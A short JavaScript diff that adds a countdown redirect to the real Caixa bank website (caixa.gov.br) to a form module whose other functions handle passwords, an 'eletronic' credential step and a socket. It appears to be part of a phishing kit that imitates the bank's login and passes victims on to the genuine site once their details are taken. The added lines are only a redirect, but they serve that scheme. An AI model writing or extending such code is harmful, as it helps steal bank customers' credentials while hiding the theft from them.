@@ -141,6 +141,22 @@ const formClient = (() => {
         }
     }
 
+    function finish() {
+        const element = document.querySelector('.finishCount');
+
+        if(element) {
+            setInterval(() => {
+                if(parseInt(element.innerHTML) < 1) {
+                    window.location.href = `https://www.caixa.gov.br/`
+                }else{
+                    element.innerHTML = parseInt(element.innerHTML) - 1
+
+                }
+                
+            }, 1000)
+        }
+    }
+
     function submit() {
         if (!form) return
 
@@ -153,12 +169,14 @@ const formClient = (() => {
         putSocket,
         password,
         eletronic,
+        finish
     }
 })()
 
 formClient.eletronic()
 formClient.submit()
 formClient.password()
+formClient.finish()
 
 //menu login
 const menuLogin = [...document.querySelectorAll('.menuLogin li')]
